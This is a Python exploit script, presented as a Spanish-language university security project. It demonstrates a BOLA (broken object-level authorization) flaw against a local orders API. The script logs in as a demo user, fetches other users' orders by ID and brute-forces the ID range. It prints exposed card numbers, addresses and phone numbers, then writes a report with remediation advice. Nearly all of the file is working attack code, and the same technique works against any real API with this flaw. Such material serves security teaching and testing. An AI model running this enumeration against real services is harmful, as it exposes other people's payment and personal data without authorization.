#!/usr/bin/env python3
"""
Exploit para demostrar vulnerabilidad BOLA (Broken Object Level Authorization)
Autor: Proyecto Universitario de Ciberseguridad
PropÃ³sito: EDUCACIONAL - DemostraciÃ³n de vulnerabilidad en entorno controlado
"""

import requests
import json
import time
from colorama import Fore, Style, init
from datetime import datetime

# Inicializar colorama
init(autoreset=True)

class BOLAExploit:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.tokens = {}
        
    def print_banner(self):
        banner = f"""
{Fore.RED}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘         BOLA EXPLOIT - DEMOSTRACIÃ“N EDUCACIONAL          â•‘
â•‘       Broken Object Level Authorization Attack           â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Style.RESET_ALL}
{Fore.YELLOW}âš ï¸  Solo para uso en entornos controlados y con permiso âš ï¸{Style.RESET_ALL}
"""
        print(banner)
    
    def login(self, email, password):
        """Autenticar usuario y obtener token JWT"""
        print(f"{Fore.CYAN}[*] Autenticando como {email}...")
        
        try:
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"email": email, "password": password}
            )
            
            if response.status_code == 200:
                data = response.json()
                token = data.get('token')
                user = data.get('user')
                self.tokens[email] = token
                
                print(f"{Fore.GREEN}[âœ“] Login exitoso: {user['name']} (ID: {user['id']})")
                return token, user
            else:
                print(f"{Fore.RED}[âœ—] Login fallido: {response.json()}")
                return None, None
                
        except Exception as e:
            print(f"{Fore.RED}[âœ—] Error: {str(e)}")
            return None, None
    
    def get_my_orders(self, token):
        """Obtener las Ã³rdenes propias del usuario"""
        print(f"\n{Fore.CYAN}[*] Obteniendo Ã³rdenes propias...")
        
        headers = {"Authorization": f"Bearer {token}"}
        response = self.session.get(
            f"{self.base_url}/api/orders",
            headers=headers
        )
        
        if response.status_code == 200:
            data = response.json()
            orders = data.get('orders', [])
            print(f"{Fore.GREEN}[âœ“] Se encontraron {len(orders)} Ã³rdenes propias")
            
            for order in orders:
                print(f"    â””â”€ Orden #{order['id']}: {order['product']} - ${order['amount']}")
            
            return orders
        else:
            print(f"{Fore.RED}[âœ—] Error al obtener Ã³rdenes")
            return []
    
    def exploit_bola(self, token, target_order_id):
        """
        Explotar vulnerabilidad BOLA intentando acceder a una orden ajena
        """
        print(f"\n{Fore.RED}[!] EXPLOTANDO BOLA - Intentando acceder a orden #{target_order_id}")
        
        headers = {"Authorization": f"Bearer {token}"}
        
        try:
            response = self.session.get(
                f"{self.base_url}/api/orders/{target_order_id}",
                headers=headers
            )
            
            if response.status_code == 200:
                order = response.json().get('order')
                
                print(f"{Fore.RED}[ğŸ’€] VULNERABILIDAD CONFIRMADA!")
                print(f"{Fore.YELLOW}[!] Acceso exitoso a datos sensibles:")
                print(f"    â”œâ”€ Orden ID: {order['id']}")
                print(f"    â”œâ”€ Usuario vÃ­ctima ID: {order['userId']}")
                print(f"    â”œâ”€ Producto: {order['product']}")
                print(f"    â”œâ”€ Monto: ${order['amount']}")
                print(f"    â”œâ”€ ğŸ’³ Tarjeta: {order.get('creditCard', 'N/A')}")
                print(f"    â”œâ”€ ğŸ“ DirecciÃ³n: {order.get('address', 'N/A')}")
                print(f"    â””â”€ ğŸ“ TelÃ©fono: {order.get('phone', 'N/A')}")
                
                return True, order
            elif response.status_code == 404:
                print(f"{Fore.YELLOW}[!] Orden no encontrada")
                return False, None
            else:
                print(f"{Fore.RED}[âœ—] Acceso denegado o error")
                return False, None
                
        except Exception as e:
            print(f"{Fore.RED}[âœ—] Error: {str(e)}")
            return False, None
    
    def brute_force_orders(self, token, max_id=20):
        """
        Intento de fuerza bruta para descubrir Ã³rdenes de otros usuarios
        """
        print(f"\n{Fore.MAGENTA}[*] Iniciando fuerza bruta de IDs (1-{max_id})...")
        
        found_orders = []
        headers = {"Authorization": f"Bearer {token}"}
        
        for order_id in range(1, max_id + 1):
            try:
                response = self.session.get(
                    f"{self.base_url}/api/orders/{order_id}",
                    headers=headers,
                    timeout=5
                )
                
                if response.status_code == 200:
                    order = response.json().get('order')
                    found_orders.append(order)
                    print(f"{Fore.GREEN}[âœ“] ID {order_id}: {order['product']} - Usuario {order['userId']}")
                else:
                    print(f"{Fore.LIGHTBLACK_EX}[Â·] ID {order_id}: No encontrado", end='\r')
                
                time.sleep(0.1)  # Delay para no saturar
                
            except Exception as e:
                print(f"{Fore.RED}[âœ—] Error en ID {order_id}")
        
        print(f"\n{Fore.GREEN}[âœ“] Fuerza bruta completada: {len(found_orders)} Ã³rdenes encontradas")
        return found_orders
    
    def generate_report(self, exploited_orders):
        """Generar reporte de la explotaciÃ³n"""
        report = f"""
{Fore.CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                   REPORTE DE EXPLOTACIÃ“N                  â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Style.RESET_ALL}

{Fore.YELLOW}Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Vulnerabilidad: BOLA (Broken Object Level Authorization)
Severidad: CRÃTICA

ğŸ“Š Resumen:
  â€¢ Ã“rdenes explotadas: {len(exploited_orders)}
  â€¢ Datos sensibles expuestos: Tarjetas, direcciones, telÃ©fonos
  â€¢ Impacto: Alto - Acceso no autorizado a informaciÃ³n confidencial

ğŸ” Datos comprometidos:
"""
        for order in exploited_orders:
            report += f"""
  Orden #{order['id']}:
    - Usuario afectado: {order['userId']}
    - Producto: {order['product']}
    - Monto: ${order['amount']}
    - Tarjeta: {order.get('creditCard', 'N/A')}
"""
        
        report += f"""
{Fore.RED}âš ï¸  RECOMENDACIONES DE SEGURIDAD:
  1. Implementar verificaciÃ³n de ownership en todas las rutas
  2. Validar que user_id coincida con el token JWT
  3. Usar middleware de autorizaciÃ³n
  4. Implementar rate limiting
  5. Logging y monitoreo de accesos sospechosos
{Style.RESET_ALL}
"""
        print(report)
        
        # Guardar reporte en archivo
        with open('exploit_report.txt', 'w', encoding='utf-8') as f:
            f.write(report)
        print(f"{Fore.GREEN}[âœ“] Reporte guardado en exploit_report.txt")


def main():
    exploit = BOLAExploit()
    exploit.print_banner()
    
    # Paso 1: Login como Alice
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"PASO 1: AutenticaciÃ³n legÃ­tima")
    print(f"{'='*60}")
    
    token_alice, user_alice = exploit.login("alice@example.com", "password123")
    if not token_alice:
        print(f"{Fore.RED}[âœ—] No se pudo autenticar. Verifica que la API estÃ© corriendo.")
        return
    
    # Paso 2: Obtener Ã³rdenes propias
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"PASO 2: Obtener Ã³rdenes propias (comportamiento normal)")
    print(f"{'='*60}")
    
    my_orders = exploit.get_my_orders(token_alice)
    
    # Paso 3: Explotar BOLA - Acceder a orden de Bob (ID 3)
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"PASO 3: EXPLOTACIÃ“N - Acceder a Ã³rdenes de otros usuarios")
    print(f"{'='*60}")
    
    # Intentar acceder a Ã³rdenes que NO pertenecen a Alice
    target_orders = [3, 4, 5, 6]  # IDs de Bob y Charlie
    exploited = []
    
    for order_id in target_orders:
        success, order = exploit.exploit_bola(token_alice, order_id)
        if success:
            exploited.append(order)
        time.sleep(0.5)
    
    # Paso 4: Fuerza bruta (opcional - comentar si quieres demo mÃ¡s rÃ¡pida)
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"PASO 4: FUERZA BRUTA - Descubrir todas las Ã³rdenes")
    print(f"{'='*60}")
    
    all_orders = exploit.brute_force_orders(token_alice, max_id=10)
    
    # Paso 5: Generar reporte
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"PASO 5: GeneraciÃ³n de reporte")
    print(f"{'='*60}")
    
    exploit.generate_report(exploited if exploited else all_orders)
    
    print(f"\n{Fore.GREEN}[âœ“] DemostraciÃ³n completada exitosamente!")
    print(f"{Fore.YELLOW}[!] Recuerda: Este exploit es solo para fines educativos")


if __name__ == "__main__":
    main()
